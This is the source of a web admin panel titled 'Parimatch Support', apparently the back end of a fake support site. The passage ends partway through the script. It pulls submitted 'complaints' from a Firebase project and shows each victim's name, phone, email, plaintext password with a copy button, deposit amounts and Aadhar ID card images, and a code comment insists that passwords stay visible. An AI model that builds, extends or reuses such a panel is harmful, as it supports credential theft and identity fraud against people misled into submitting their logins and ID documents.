<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Panel — Parimatch Support</title>
  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='6' fill='%23F5FF00'/%3E%3Cpath d='M7 12l3 3 7-7' fill='none' stroke='%231c1f28' stroke-width='2.4' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;0,9..40,800;1,9..40,400&display=swap" rel="stylesheet" />
  <style>
    :root {
      --bg: #0a0b0f;
      --surface: #16181e;
      --surface-2: #1e2128;
      --surface-3: #252a36;
      --border: #2a2e3a;
      --border-soft: #232733;
      --text: #eceef3;
      --muted: #9aa1b2;
      --accent: #F5FF00;
      --accent-dark: #1c1f28;
      --green: #35c98b;
      --green-soft: rgba(53, 201, 139, 0.14);
      --red: #ff6b6f;
      --red-soft: rgba(255, 107, 111, 0.14);
      --blue: #7b92ff;
      --blue-soft: rgba(123, 146, 255, 0.14);
      --warn: #f0b543;
      --warn-soft: rgba(240, 181, 67, 0.14);
      --radius: 14px;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    html { color-scheme: dark; }
    [hidden] { display: none !important; }

    body {
      min-height: 100vh;
      background:
        radial-gradient(900px 520px at 100% -10%, rgba(245, 255, 0, 0.08), transparent 60%),
        radial-gradient(720px 420px at -10% 8%, rgba(123, 146, 255, 0.08), transparent 55%),
        var(--bg);
      color: var(--text);
      font-family: "DM Sans", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
      font-size: 15px;
      line-height: 1.5;
    }

    button, a { font: inherit; }
    button { cursor: pointer; }
    a { color: inherit; }

    .topbar {
      position: sticky;
      top: 0;
      z-index: 50;
      background: rgba(22, 24, 30, 0.82);
      border-bottom: 1px solid var(--border);
      backdrop-filter: blur(14px);
      -webkit-backdrop-filter: blur(14px);
    }

    .topbar-inner {
      max-width: 1120px;
      margin: 0 auto;
      padding: 14px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 12px;
      min-width: 0;
    }

    .logo-mark {
      width: 42px;
      height: 42px;
      border-radius: 11px;
      background: var(--accent);
      color: var(--accent-dark);
      display: grid;
      place-items: center;
      flex-shrink: 0;
      box-shadow: 0 8px 24px rgba(245, 255, 0, 0.16);
    }

    .logo-mark svg { width: 24px; height: 24px; }

    .brand-title {
      font-size: 1rem;
      font-weight: 800;
      letter-spacing: -0.02em;
      line-height: 1.2;
    }

    .brand-sub {
      margin-top: 2px;
      font-size: 0.72rem;
      font-weight: 700;
      letter-spacing: 0.12em;
      text-transform: uppercase;
      color: var(--accent);
    }

    .live-chip {
      display: inline-flex;
      align-items: center;
      gap: 7px;
      height: 30px;
      padding: 0 12px;
      border-radius: 999px;
      border: 1px solid var(--border);
      background: var(--surface-2);
      color: var(--muted);
      font-size: 0.74rem;
      font-weight: 700;
      letter-spacing: 0.04em;
      flex-shrink: 0;
    }

    .live-dot {
      width: 7px;
      height: 7px;
      border-radius: 50%;
      background: var(--green);
      box-shadow: 0 0 0 4px rgba(53, 201, 139, 0.13);
    }

    .container {
      max-width: 1120px;
      margin: 0 auto;
      padding: 30px 20px 64px;
    }

    .hero {
      display: flex;
      align-items: flex-end;
      justify-content: flex-end;
      gap: 24px;
      margin-bottom: 24px;
    }

    .eyebrow {
      display: inline-block;
      margin-bottom: 8px;
      font-size: 0.72rem;
      font-weight: 800;
      letter-spacing: 0.16em;
      text-transform: uppercase;
      color: var(--accent);
    }

    .hero h1 {
      font-size: clamp(1.7rem, 4vw, 2.4rem);
      line-height: 1.08;
      letter-spacing: -0.04em;
      font-weight: 800;
    }

    .hero p {
      margin-top: 8px;
      max-width: 560px;
      color: var(--muted);
      font-size: 0.9rem;
    }

    .stats {
      display: flex;
      gap: 10px;
      flex-shrink: 0;
    }

    .stat-card {
      min-width: 96px;
      padding: 11px 16px;
      border: 1px solid var(--border);
      border-radius: 12px;
      background: linear-gradient(180deg, rgba(37, 42, 54, 0.7), rgba(22, 24, 30, 0.9));
    }

    .stat-card strong {
      display: block;
      font-size: 1.35rem;
      line-height: 1.1;
      letter-spacing: -0.03em;
    }

    .stat-card span {
      display: block;
      margin-top: 3px;
      color: var(--muted);
      font-size: 0.7rem;
      font-weight: 700;
      letter-spacing: 0.08em;
      text-transform: uppercase;
    }

    .toolbar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 14px;
      flex-wrap: wrap;
      margin-bottom: 18px;
      padding: 10px;
      border: 1px solid var(--border);
      border-radius: 14px;
      background: rgba(22, 24, 30, 0.72);
    }

    .tabs {
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
    }

    .tab {
      height: 40px;
      padding: 0 18px;
      border: 1px solid var(--border);
      border-radius: 10px;
      background: var(--surface-2);
      color: var(--muted);
      font-size: 0.84rem;
      font-weight: 700;
      transition: background 0.18s, color 0.18s, border-color 0.18s, transform 0.18s;
    }

    .tab:hover {
      color: var(--text);
      border-color: #3a4050;
    }

    .tab.active {
      background: var(--accent);
      border-color: var(--accent);
      color: var(--accent-dark);
      box-shadow: 0 8px 22px rgba(245, 255, 0, 0.16);
    }

    .result-pill {
      padding: 0 6px;
      color: var(--muted);
      font-size: 0.8rem;
      font-weight: 600;
      white-space: nowrap;
    }

    .result-pill strong { color: var(--text); }

    .demo-notice {
      display: flex;
      align-items: center;
      gap: 9px;
      margin-bottom: 14px;
      padding: 10px 13px;
      border: 1px dashed rgba(245, 255, 0, 0.34);
      border-radius: 10px;
      background: rgba(245, 255, 0, 0.055);
      color: var(--muted);
      font-size: 0.78rem;
      line-height: 1.4;
    }

    .demo-notice strong { color: var(--accent); }

    .demo-dot {
      width: 7px;
      height: 7px;
      border-radius: 50%;
      background: var(--accent);
      flex-shrink: 0;
      box-shadow: 0 0 0 4px rgba(245, 255, 0, 0.1);
    }

    .list {
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .complaint {
      position: relative;
      padding: 20px;
      border: 1px solid var(--border);
      border-radius: var(--radius);
      background:
        linear-gradient(180deg, rgba(30, 33, 40, 0.72), rgba(22, 24, 30, 0.92));
      box-shadow: 0 18px 50px rgba(0, 0, 0, 0.18);
      overflow: hidden;
    }

    .complaint::before {
      content: "";
      position: absolute;
      inset: 0 auto 0 0;
      width: 3px;
      background: linear-gradient(180deg, var(--accent), rgba(245, 255, 0, 0.08));
      opacity: 0.8;
    }

    .complaint-top {
      display: flex;
      align-items: flex-start;
      justify-content: space-between;
      gap: 14px;
      margin-bottom: 16px;
    }

    .complaint-head {
      display: flex;
      align-items: center;
      gap: 12px;
      min-width: 0;
    }

    .type-icon {
      width: 44px;
      height: 44px;
      border-radius: 12px;
      border: 1px solid rgba(245, 255, 0, 0.22);
      background: rgba(245, 255, 0, 0.1);
      color: var(--accent);
      display: grid;
      place-items: center;
      font-size: 1.05rem;
      font-weight: 800;
      flex-shrink: 0;
    }

    .complaint-title {
      font-size: 1.05rem;
      font-weight: 800;
      letter-spacing: -0.02em;
      line-height: 1.25;
      word-break: break-word;
    }

    .complaint-meta {
      margin-top: 3px;
      color: var(--muted);
      font-size: 0.76rem;
      word-break: break-word;
    }

    .meta-sep { opacity: 0.45; padding: 0 4px; }

    .status {
      display: inline-flex;
      align-items: center;
      height: 26px;
      padding: 0 10px;
      border-radius: 999px;
      font-size: 0.68rem;
      font-weight: 800;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      flex-shrink: 0;
    }

    .status.pending { background: var(--warn-soft); color: var(--warn); }
    .status.success { background: var(--green-soft); color: var(--green); }
    .status.danger { background: var(--red-soft); color: var(--red); }
    .status.info { background: var(--blue-soft); color: var(--blue); }

    .detail-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(170px, 1fr));
      gap: 8px;
      margin-bottom: 16px;
    }

    .detail {
      min-width: 0;
      padding: 9px 11px;
      border: 1px solid var(--border-soft);
      border-radius: 10px;
      background: rgba(10, 11, 15, 0.44);
    }

    .detail-label {
      display: block;
      color: var(--muted);
      font-size: 0.66rem;
      font-weight: 800;
      letter-spacing: 0.08em;
      text-transform: uppercase;
    }

    .detail-value {
      display: block;
      margin-top: 3px;
      font-size: 0.86rem;
      font-weight: 600;
      word-break: break-word;
      overflow-wrap: anywhere;
    }

    .attachments {
      border-top: 1px solid var(--border);
      padding-top: 14px;
    }

    .attachments h3 {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 9px;
      color: var(--muted);
      font-size: 0.7rem;
      font-weight: 800;
      letter-spacing: 0.1em;
      text-transform: uppercase;
    }

    .attachment-count {
      display: inline-grid;
      place-items: center;
      min-width: 18px;
      height: 18px;
      padding: 0 5px;
      border-radius: 999px;
      background: var(--surface-3);
      color: var(--text);
      font-size: 0.66rem;
      letter-spacing: 0;
    }

    .file-list {
      display: flex;
      flex-direction: column;
      gap: 8px;
    }

    .file-row {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 9px 10px;
      border: 1px solid var(--border-soft);
      border-radius: 10px;
      background: rgba(30, 33, 40, 0.62);
    }

    .file-icon {
      width: 34px;
      height: 34px;
      border-radius: 9px;
      background: var(--surface-2);
      color: var(--accent);
      display: grid;
      place-items: center;
      flex-shrink: 0;
    }

    .file-icon svg { width: 17px; height: 17px; }

    .file-meta {
      flex: 1;
      min-width: 0;
      display: flex;
      flex-direction: column;
      gap: 1px;
    }

    .file-meta strong {
      font-size: 0.8rem;
      font-weight: 700;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    .file-meta span {
      color: var(--muted);
      font-size: 0.71rem;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 7px;
      height: 38px;
      padding: 0 15px;
      border: 1px solid transparent;
      border-radius: 9px;
      text-decoration: none;
      font-size: 0.8rem;
      font-weight: 800;
      transition: background 0.18s, color 0.18s, border-color 0.18s, transform 0.18s;
      white-space: nowrap;
      flex-shrink: 0;
    }

    .btn:active { transform: translateY(1px); }

    .btn.primary {
      background: var(--accent);
      color: var(--accent-dark);
    }

    .btn.primary:hover { background: #E8F100; }

    .btn.ghost {
      background: var(--surface-2);
      border-color: var(--border);
      color: var(--text);
    }

    .btn.ghost:hover { background: var(--surface-3); }

    .btn.view-btn {
      height: 32px;
      padding: 0 12px;
      border-color: rgba(245, 255, 0, 0.3);
      background: rgba(245, 255, 0, 0.08);
      color: var(--accent);
      font-size: 0.74rem;
    }

    .btn.view-btn:hover {
      background: rgba(245, 255, 0, 0.16);
      border-color: rgba(245, 255, 0, 0.55);
    }

    .btn.disabled {
      opacity: 0.45;
      pointer-events: none;
    }

    .no-files {
      padding: 11px 12px;
      border: 1px dashed var(--border);
      border-radius: 10px;
      color: var(--muted);
      font-size: 0.8rem;
    }

    .complaint-foot {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 10px;
      flex-wrap: wrap;
      margin-top: 14px;
      padding-top: 12px;
      border-top: 1px solid var(--border);
      color: var(--muted);
      font-size: 0.72rem;
    }

    .password-tag {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 3px 9px;
      border-radius: 999px;
      background: var(--surface-2);
      border: 1px solid var(--border);
      font-size: 0.68rem;
      font-weight: 700;
    }

    .password-tag::before {
      content: "";
      width: 6px;
      height: 6px;
      border-radius: 50%;
      background: var(--muted);
    }

    .password-tag.on::before { background: var(--green); }

    .empty {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      gap: 8px;
      min-height: 300px;
      padding: 40px 24px;
      border: 1px dashed var(--border);
      border-radius: var(--radius);
      background: rgba(22, 24, 30, 0.55);
    }

    .empty-icon {
      width: 58px;
      height: 58px;
      border-radius: 50%;
      background: var(--surface-2);
      border: 1px solid var(--border);
      color: var(--muted);
      display: grid;
      place-items: center;
      margin-bottom: 6px;
    }

    .empty-icon svg { width: 26px; height: 26px; }
    .empty h2 { font-size: 1.05rem; font-weight: 800; }
    .empty p { max-width: 360px; color: var(--muted); font-size: 0.85rem; }

    .viewer-overlay {
      position: fixed;
      inset: 0;
      z-index: 1000;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 18px;
      background: rgba(4, 5, 8, 0.78);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      opacity: 0;
      transition: opacity 0.2s;
    }

    .viewer-overlay.open { opacity: 1; }

    .viewer-modal {
      width: min(760px, 100%);
      max-height: calc(100vh - 36px);
      display: flex;
      flex-direction: column;
      gap: 12px;
      padding: 16px;
      border: 1px solid var(--border);
      border-radius: 16px;
      background: var(--surface);
      box-shadow: 0 30px 90px rgba(0, 0, 0, 0.55);
      transform: translateY(8px) scale(0.98);
      transition: transform 0.22s cubic-bezier(0.2, 0.9, 0.3, 1.05);
    }

    .viewer-overlay.open .viewer-modal { transform: translateY(0) scale(1); }

    .viewer-head {
      display: flex;
      align-items: flex-start;
      justify-content: space-between;
      gap: 12px;
    }

    .viewer-head h3 {
      font-size: 0.98rem;
      font-weight: 800;
      word-break: break-word;
    }

    .viewer-head p {
      margin-top: 3px;
      color: var(--muted);
      font-size: 0.74rem;
      word-break: break-word;
    }

    .icon-btn {
      width: 36px;
      height: 36px;
      border: 1px solid var(--border);
      border-radius: 9px;
      background: var(--surface-2);
      color: var(--muted);
      display: grid;
      place-items: center;
      flex-shrink: 0;
    }

    .icon-btn:hover { background: var(--surface-3); color: var(--text); }
    .icon-btn svg { width: 16px; height: 16px; }

    .viewer-body {
      flex: 1;
      min-height: 180px;
      max-height: 64vh;
      display: grid;
      place-items: center;
      padding: 10px;
      border: 1px solid var(--border-soft);
      border-radius: 12px;
      background: #0d0f14;
      overflow: auto;
    }

    .viewer-body img {
      display: block;
      max-width: 100%;
      max-height: 60vh;
      object-fit: contain;
      border-radius: 8px;
    }

    .viewer-fallback {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 8px;
      padding: 30px 20px;
      color: var(--muted);
      text-align: center;
      font-size: 0.85rem;
    }

    .viewer-fallback svg {
      width: 42px;
      height: 42px;
      color: var(--accent);
      opacity: 0.8;
    }

    .viewer-actions {
      display: flex;
      align-items: center;
      justify-content: flex-end;
      gap: 10px;
      flex-wrap: wrap;
    }

    .viewer-open { overflow: hidden; }

    @media (max-width: 720px) {
      .container { padding: 22px 14px 48px; }
      .topbar-inner { padding: 12px 14px; }
      .hero { align-items: flex-start; flex-direction: column; gap: 16px; }
      .stats { width: 100%; }
      .stat-card { flex: 1; min-width: 0; }
      .complaint { padding: 16px; }
      .complaint-top { flex-direction: column; }
      .status { align-self: flex-start; }
      .detail-grid { grid-template-columns: 1fr 1fr; }
      .file-row { align-items: flex-start; }
      .btn.view-btn { height: 30px; padding: 0 10px; }
    }

    @media (max-width: 480px) {
      .detail-grid { grid-template-columns: 1fr; }
      .toolbar { align-items: stretch; }
      .tabs { width: 100%; }
      .tab { flex: 1; padding: 0 10px; font-size: 0.78rem; }
      .result-pill { width: 100%; text-align: right; padding: 0; }
      .viewer-actions .btn { flex: 1; }
    }
  
    .detail.has-copy {
      display: flex;
      align-items: flex-start;
      justify-content: space-between;
      gap: 8px;
    }
    .detail-main { flex: 1; min-width: 0; }
    .copy-btn {
      width: 28px;
      height: 28px;
      border: 1px solid var(--border);
      border-radius: 8px;
      background: var(--surface-2);
      color: var(--muted);
      display: grid;
      place-items: center;
      flex-shrink: 0;
      cursor: pointer;
      transition: background 0.15s, color 0.15s, border-color 0.15s;
    }
    .copy-btn:hover { background: var(--surface-3); color: var(--text); border-color: #3a4050; }
    .copy-btn.copied { background: rgba(53,201,139,0.15); border-color: rgba(53,201,139,0.3); color: var(--green); }
    .copy-btn svg { width: 14px; height: 14px; }
    .copy-toast {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%) translateY(10px);
      background: #1e2128;
      color: var(--text);
      border: 1px solid var(--border);
      padding: 8px 14px;
      border-radius: 10px;
      font-size: 0.82rem;
      font-weight: 700;
      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
      opacity: 0;
      transition: opacity 0.2s, transform 0.2s;
      z-index: 9999;
      pointer-events: none;
    }
    .copy-toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }

  </style>
  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>

</head>
<body>
  <main class="container" id="adminApp">
    <section class="hero">
      <div class="stats">
        <div class="stat-card">
          <strong id="totalCount">0</strong>
          <span>Total</span>
        </div>
        <div class="stat-card">
          <strong id="todayCount">0</strong>
          <span>Today</span>
        </div>
      </div>
    </section>

    <section class="toolbar">
      <div class="tabs" role="group" aria-label="Complaint filter">
        <button class="tab" type="button" id="todayBtn" aria-pressed="false">Today Complaints</button>
        <button class="tab active" type="button" id="allBtn" aria-pressed="true">All Complaints</button>
      </div>
      <div class="result-pill"><strong id="resultCount">0</strong> complaints</div>
    </section>

    <section class="list" id="list" aria-live="polite"></section>
  </main>

  <div class="viewer-overlay" id="viewer" hidden>
    <div class="viewer-modal" role="dialog" aria-modal="true" aria-labelledby="viewerTitle">
      <div class="viewer-head">
        <div>
          <h3 id="viewerTitle">Attachment</h3>
          <p id="viewerMeta"></p>
        </div>
        <button class="icon-btn" id="viewerClose" type="button" aria-label="Close">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
            <line x1="18" y1="6" x2="6" y2="18"></line>
            <line x1="6" y1="6" x2="18" y2="18"></line>
          </svg>
        </button>
      </div>

      <div class="viewer-body">
        <img id="viewerImg" alt="" />
        <div class="viewer-fallback" id="viewerFallback" hidden>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
            <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"></path>
            <polyline points="14 2 14 8 20 8"></polyline>
          </svg>
          <span>Preview is not available for this file.</span>
        </div>
      </div>

      <div class="viewer-actions">
        <a class="btn primary" id="downloadBtn" download>Download</a>
        <button class="btn ghost" id="closeBtn" type="button">Close</button>
      </div>
    </div>
  </div>

  <script>
    (function () {
      // ---- Firebase Config ----
      const firebaseConfig = {
        apiKey: "AIzaSyCs-Sw1hpSReWuAnVhHsKtb1ajZp_OVdJ8",
        authDomain: "new-blog-2b15e.firebaseapp.com",
        projectId: "new-blog-2b15e",
        storageBucket: "new-blog-2b15e.firebasestorage.app",
        messagingSenderId: "694308724175",
        appId: "1:694308724175:web:bd26e81f0472b018e546ba"
      };
      if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
      const db = firebase.firestore();

      const KEY = 'parimatch_complains';
      const BASE_FIELDS = ['userName', 'mobile', 'email'];
      const PREFERRED_KEYS = [
        'userName',
        'mobile',
        'email',
        'password',
        'depositAmount',
        'withdrawalAmount',
        'amount',
        'message',
      ];

      const LABELS = {
        userName: 'User Name',
        mobile: 'Mobile Number',
        email: 'E-mail ID',
        password: 'Set Password',
        depositAmount: 'Deposit Amount',
        withdrawalAmount: 'Withdrawal Amount',
        amount: 'Amount',
        message: 'Message',
        paymentImage: 'Payment Image',
        issueImage: 'Issue Image',
        aadharFront: 'Aadhar Front',
        aadharBack: 'Aadhar Back',
      };

      const list = document.getElementById('list');
      const totalCount = document.getElementById('totalCount');
      const todayCount = document.getElementById('todayCount');
      const resultCount = document.getElementById('resultCount');
      const todayBtn = document.getElementById('todayBtn');
      const allBtn = document.getElementById('allBtn');
      const viewer = document.getElementById('viewer');
      const viewerTitle = document.getElementById('viewerTitle');
      const viewerMeta = document.getElementById('viewerMeta');
      const viewerImg = document.getElementById('viewerImg');
      const viewerFallback = document.getElementById('viewerFallback');
      const viewerClose = document.getElementById('viewerClose');
      const closeBtn = document.getElementById('closeBtn');
      const downloadBtn = document.getElementById('downloadBtn');

      let filter = 'all';
      let allRows = [];
      let unsubscribe = null;

      function escapeHtml(value) {
        return String(value == null ? '' : value).replace(/[&<>"']/g, (ch) => ({
          '&': '&amp;',
          '<': '&lt;',
          '>': '&gt;',
          '"': '&quot;',
          "'": '&#39;',
        })[ch]);
      }

      function labelFor(key) {
        if (LABELS[key]) return LABELS[key];
        return String(key || '')
          .replace(/([A-Z])/g, ' $1')
          .replace(/^./, (ch) => ch.toUpperCase());
      }

      function formatDate(iso) {
        if (!iso) return '—';
        let date;
        if (iso && typeof iso.toDate === 'function') date = iso.toDate();
        else if (iso && iso.seconds) date = new Date(iso.seconds * 1000);
        else date = new Date(iso);
        if (Number.isNaN(date.getTime())) return String(iso) || '—';
        return date.toLocaleString('en-IN', { dateStyle: 'medium', timeStyle: 'short' });
      }

      function isToday(iso) {
        let date;
        if (!iso) return false;
        if (iso && typeof iso.toDate === 'function') date = iso.toDate();
        else if (iso && iso.seconds) date = new Date(iso.seconds * 1000);
        else date = new Date(iso);
        if (Number.isNaN(date.getTime())) return false;
        const now = new Date();
        return (
          date.getFullYear() === now.getFullYear() &&
          date.getMonth() === now.getMonth() &&
          date.getDate() === now.getDate()
        );
      }

      function formatSize(bytes) {
        const size = Number(bytes) || 0;
        if (size <= 0) return '';
        if (size < 1024) return `${size} B`;
        if (size < 1024 * 1024) return `${(size / 1024).toFixed(1)} KB`;
        return `${(size / 1024 / 1024).toFixed(2)} MB`;
      }

      function isImage(file) {
        if (!file) return false;
        if ((file.type || '').startsWith('image/')) return true;
        if ((file.data || '').startsWith('data:image/')) return true;
        if ((file.url || '').match(/\.(png|jpe?g|gif|webp|bmp|heic|heif|svg)(\?|$)/i)) return true;
        return /\.(png|jpe?g|gif|webp|bmp|heic|heif)(\?|$)/i.test(file.url || file.name || '');
      }

      function fileSrc(file) {
        if (!file) return '';
        return file.url || file.data || '';
      }

      function normalizeFiles(files) {
        const out = {};
        if (!files || typeof files !== 'object') return out;
        Object.entries(files).forEach(([key, file]) => {
          if (!file || typeof file !== 'object') return;
          out[key] = {
            name: file.name || key,
            type: file.type || '',
            size: Number(file.size) || 0,
            url: file.url || '',
            data: typeof file.data === 'string' ? file.data : '',
          };
        });
        return out;
      }

      function normalizeRow(row) {
        if (!row || typeof row !== 'object') return null;
        const id = String(row.id || '');
        if (!id) return null;
        const type = String(row.type || '');
        const title = String(row.title || (type ? `${type} Complain` : 'Complain'));
        let createdAt = row.createdAt || row.created_at || new Date().toISOString();
        if (createdAt && typeof createdAt.toDate === 'function') createdAt = createdAt.toDate().toISOString();
        else if (createdAt && createdAt.seconds) createdAt = new Date(createdAt.seconds * 1000).toISOString();
        const status = String(row.status || 'pending');
        let details = {};
        if (row.details && typeof row.details === 'object') {
          details = { ...row.details };
        } else {
          details = {
            userName: row.userName || row.user_name || '',
            mobile: row.mobile || '',
            email: row.email || '',
          };
          if (row.amount) details.amount = row.amount;
          if (row.message) details.message = row.message;
        }
        const hasPassword = Boolean(row.hasPassword) || Boolean(details.password);
        // Keep password visible in admin - do not delete
        return {
          id,
          type,
          title,
          createdAt,
          status,
          details,
          hasPassword,
          files: normalizeFiles(row.files),
        };
      }

      function detailKeys(details) {
        const keys = Object.keys(details || {});
        return [
          ...PREFERRED_KEYS.filter((key) => keys.includes(key)),
          ...keys.filter((key) => !PREFERRED_KEYS.includes(key)),
        ];
      }

      const COPY_KEYS = ['mobile', 'email', 'password'];
      function copyIconSvg() {
        return `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"></rect><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"></path></svg>`;
      }
      function tickIconSvg() {
        return `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5 10-10"></path></svg>`;
      }
      function showToast(msg) {
        let toast = document.getElementById('copyToast');
        if (!toast) {
          toast = document.createElement('div');
          toast.id = 'copyToast';
          toast.className = 'copy-toast';
          document.body.appendChild(toast);
        }
        toast.textContent = msg;
        toast.classList.add('show');
        clearTimeout(toast._timer);
        toast._timer = setTimeout(() => toast.classList.remove('show'), 1800);
      }
      function detailsHtml(details) {
        const keys = detailKeys(details);
        if (!keys.length) {
          return `
            <div class="detail">
              <span class="detail-label">Details</span>
              <span class="detail-value">—</span>
            </div>`;
        }
        return keys.map((key) => {
          const value = details[key];
          const shown = value === undefined || value === null || String(value).trim() === '' ? '—' : value;
          const canCopy = COPY_KEYS.includes(key) && shown !== '—';
          if (canCopy) {
            return `
              <div class="detail has-copy">
                <div class="detail-main">
                  <span class="detail-label">${escapeHtml(labelFor(key))}</span>
                  <span class="detail-value">${escapeHtml(shown)}</span>
                </div>
                <button class="copy-btn" type="button" data-copy="${escapeHtml(String(value))}" aria-label="Copy ${escapeHtml(labelFor(key))}" title="Copy">
                  ${copyIconSvg()}
                </button>
              </div>`;
          }
          return `
            <div class="detail">
              <span class="detail-label">${escapeHtml(labelFor(key))}</span>
              <span class="detail-value">${escapeHtml(shown)}</span>
            </div>`;
        }).join('');
      }

      function fileIconSvg(image) {
        if (image) {
          return `
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
              <rect x="3" y="3" width="18" height="18" rx="2"></rect>
              <circle cx="8.5" cy="8.5" r="1.5"></circle>
              <path d="M21 15l-5-5L5 21"></path>
            </svg>`;
        }
        return `
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
            <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"></path>
            <polyline points="14 2 14 8 20 8"></polyline>
            <line x1="8" y1="13" x2="16" y2="13"></line>
            <line x1="8" y1="17" x2="14" y2="17"></line>
          </svg>`;
      }

      function filesHtml(row) {
        const entries = Object.entries(row.files || {});
        if (!entries.length) {
          return `
            <div class="attachments">
              <h3>Attachments</h3>
              <div class="no-files">No attachments uploaded.</div>
            </div>`;
        }
        return `
          <div class="attachments">
            <h3>Attachments <span class="attachment-count">${entries.length}</span></h3>
            <div class="file-list">
              ${entries.map(([key, file]) => {
                const image = isImage(file);
                const size = formatSize(file.size);
                return `
                  <div class="file-row">
                    <div class="file-icon">${fileIconSvg(image)}</div>
                    <div class="file-meta">
                      <strong>${escapeHtml(labelFor(key))}</strong>
                      <span>${escapeHtml(file.name || 'Attachment')}${size ? ` • ${escapeHtml(size)}` : ''}</span>
                    </div>
                    <button
                      class="btn view-btn"
                      type="button"
                      data-id="${escapeHtml(row.id)}"
                      data-key="${escapeHtml(key)}"
                    >View</button>
                  </div>`;
              }).join('')}
            </div>
          </div>`;
      }

      function statusClass(status) {
        const value = String(status || '').toLowerCase();
        return ['pending', 'success', 'danger', 'warning', 'info'].includes(value) ? value : 'pending';
      }

      function statusLabel(status) {
        const value = String(status || 'pending');
        return value.charAt(0).toUpperCase() + value.slice(1);
      }

      function cardHtml(row) {
        const type = row.type || 'Complaint';
        const initial = type.trim().charAt(0).toUpperCase() || 'C';
        return `
          <article class="complaint" data-id="${escapeHtml(row.id)}">
            <div class="complaint-top">
              <div class="complaint-head">
                <div class="type-icon" aria-hidden="true">${escapeHtml(initial)}</div>
                <div>
                  <h2 class="complaint-title">${escapeHtml(row.title || `${type} Complain`)}</h2>
                  <p class="complaint-meta">
                    #${escapeHtml(row.id)}
                    <span class="meta-sep">•</span>
                    ${escapeHtml(formatDate(row.createdAt))}
                  </p>
                </div>
              </div>
              <span class="status ${statusClass(row.status)}">${escapeHtml(statusLabel(row.status))}</span>
            </div>
            <div class="detail-grid">${detailsHtml(row.details)}</div>
            ${filesHtml(row)}
            <div class="complaint-foot">
              <span>Complaint ID: ${escapeHtml(row.id)}</span>
              <span class="password-tag ${row.hasPassword ? 'on' : ''}">
                ${row.hasPassword ? 'Password set' : 'No password'}
              </span>
            </div>
          </article>`;
      }

      function emptyHtml() {
        return `
          <div class="empty">
            <div class="empty-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
                <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"></path>
                <line x1="8" y1="9" x2="16" y2="9"></line>
                <line x1="8" y1="13" x2="13" y2="13"></line>
              </svg>
            </div>
            <h2>${filter === 'today' ? 'No complaints today' : 'No complaints yet'}</h2>
            <p>${filter === 'today'
              ? 'Complaints submitted today will appear here.'
              : 'All complaints from all 5 pages will appear here in real-time via Firebase. Submit a test complaint to see it live.'}</p>
          </div>`;
      }

      function setFilter(next) {
        filter = next;
        render();
      }

      function render() {
        const todayRows = allRows.filter((row) => isToday(row.createdAt));
        const visible = filter === 'today' ? todayRows : allRows;
        totalCount.textContent = String(allRows.length);
        todayCount.textContent = String(todayRows.length);
        resultCount.textContent = String(visible.length);
        todayBtn.classList.toggle('active', filter === 'today');
        allBtn.classList.toggle('active', filter === 'all');
        todayBtn.setAttribute('aria-pressed', String(filter === 'today'));
        allBtn.setAttribute('aria-pressed', String(filter === 'all'));
